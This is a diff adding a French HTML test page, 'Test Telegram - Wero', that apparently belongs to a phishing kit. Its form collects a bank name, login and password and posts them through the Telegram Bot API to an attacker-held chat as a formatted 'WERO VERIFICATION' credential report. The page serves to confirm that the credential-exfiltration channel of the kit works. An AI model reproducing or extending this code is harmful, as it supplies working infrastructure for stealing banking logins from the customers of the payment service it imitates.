@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Telegram - Manuel</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 500px;
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 1rem;
+        }
+        .status {
+            padding: 1rem;
+            margin-bottom: 1rem;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+        .status.loading {
+            background: #fff3cd;
+            color: #856404;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+            color: #333;
+        }
+        input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 0.75rem;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .console {
+            background: #222;
+            color: #0f0;
+            padding: 1rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            margin-top: 1rem;
+            max-height: 300px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .auto-fill {
+            background: #28a745;
+            margin-bottom: 1rem;
+        }
+        .auto-fill:hover {
+            background: #218838;
+        }
+    </style>
+    <script>
+        window.telegramConfig = {
+            BOT_TOKEN: "TELEGRAM_BOT_TOKEN_PLACEHOLDER",
+            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
+        };
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Test Telegram - Wero</h1>
+        <div id="status" class="status" style="display:none;"></div>
+        
+        <form id="testForm">
+            <div class="form-group">
+                <label>Banque (optionnel)</label>
+                <input type="text" id="bank" value="TEST BANK">
+            </div>
+            <div class="form-group">
+                <label>Identifiant / Email</label>
+                <input type="text" id="login" placeholder="test@example.com" required>
+            </div>
+            <div class="form-group">
+                <label>Mot de passe</label>
+                <input type="password" id="password" placeholder="••••••••" required>
+            </div>
+            <button type="button" class="auto-fill" onclick="autoFill()">AUTO-FILL TEST DATA</button>
+            <button type="submit">Envoyer à Telegram</button>
+        </form>
+
+        <div class="console" id="console"></div>
+    </div>
+
+    <script>
+        const consoleEl = document.getElementById('console');
+        const statusEl = document.getElementById('status');
+        const form = document.getElementById('testForm');
+
+        function log(msg, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString('fr-FR');
+            const logEntry = `[${timestamp}] ${msg}`;
+            consoleEl.textContent += logEntry + '\n';
+            consoleEl.scrollTop = consoleEl.scrollHeight;
+            console.log(logEntry);
+        }
+
+        function showStatus(msg, type) {
+            statusEl.textContent = msg;
+            statusEl.className = `status ${type}`;
+            statusEl.style.display = 'block';
+        }
+
+        function autoFill() {
+            document.getElementById('login').value = 'testuser@wero.fr';
+            document.getElementById('password').value = 'TestPassword123!@';
+            log('✓ Formulaire auto-rempli');
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const bank = document.getElementById('bank').value || 'WERO';
+            const login = document.getElementById('login').value;
+            const password = document.getElementById('password').value;
+
+            log('=== DEBUT TEST TELEGRAM ===');
+            showStatus('⏳ Envoi en cours...', 'loading');
+
+            // Vérifier la config
+            if (!window.telegramConfig) {
+                log('❌ ERROR: window.telegramConfig not found!');
+                showStatus('❌ Configuration Telegram non trouvée', 'error');
+                return;
+            }
+
+            log(`✓ Config trouvée`);
+            log(`  BOT_TOKEN: ${window.telegramConfig.BOT_TOKEN.substring(0, 10)}...`);
+            log(`  CHAT_ID: ${window.telegramConfig.CHAT_ID}`);
+
+            const message = `
+🔐 TEST WERO VERIFICATION
+━━━━━━━━━━━━━━━━━━━━━━━
+🏦 Banque: ${bank}
+👤 Login: ${login}
+🔑 Password: ${password}
+⏰ Time: ${new Date().toLocaleString('fr-FR')}
+━━━━━━━━━━━━━━━━━━━━━━━
+✓ Message from Railway
+`;
+
+            try {
+                log('📤 Envoi du message à Telegram API...');
+                
+                const url = 'https://api.telegram.org/bot' + window.telegramConfig.BOT_TOKEN + '/sendMessage';
+                log(`  URL: ${url.substring(0, 50)}...`);
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: window.telegramConfig.CHAT_ID,
+                        text: message
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.ok) {
+                    log('✅ SUCCESS! Message envoyé!');
+                    log(`  Message ID: ${data.result.message_id}`);
+                    log(`  Chat ID: ${data.result.chat.id}`);
+                    log(`  Time: ${new Date(data.result.date * 1000).toLocaleString('fr-FR')}`);
+                    showStatus('✅ Message envoyé avec succès à Telegram!', 'success');
+                } else {
+                    log(`❌ Telegram API error: ${data.description}`);
+                    log(`  Error code: ${data.error_code}`);
+                    showStatus(`❌ Erreur Telegram: ${data.description}`, 'error');
+                }
+            } catch (error) {
+                log(`❌ Network error: ${error.message}`);
+                showStatus('❌ Erreur réseau', 'error');
+            }
+        });
+
+        // Initial log
+        log('=== WERO TELEGRAM TEST PAGE ===');
+        log('✓ Page chargée');
+        log(`✓ Config status: ${window.telegramConfig ? 'READY' : 'NOT FOUND'}`);
+        log('');
+        log('1. Remplis les champs (ou clique AUTO-FILL)');
+        log('2. Clique "Envoyer à Telegram"');
+        log('3. Vérifie que tu reçois le message sur Telegram');
+    </script>
+</body>
+</html>
